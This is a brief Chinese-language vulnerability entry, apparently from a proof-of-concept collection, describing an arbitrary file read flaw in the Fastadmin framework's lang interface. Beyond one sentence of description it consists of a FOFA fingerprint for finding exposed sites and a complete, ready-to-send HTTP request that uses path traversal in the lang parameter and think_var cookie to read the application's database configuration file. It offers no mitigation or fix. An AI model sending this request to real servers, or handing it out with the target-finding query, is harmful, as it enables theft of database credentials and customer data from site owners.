## Fastadmin框架存在任意文件读取漏洞

Fastadmin框架 lang接口处存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。

## fofa

```
icon_hash="-1036943727"
```

## poc

```
GET /index/ajax/lang?lang=..//..//application/database HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Cookie: think_var=..%2F%2F..%2F%2Fapplication%2Fdatabase
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```

![image-20240616143331144](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406161433252.png)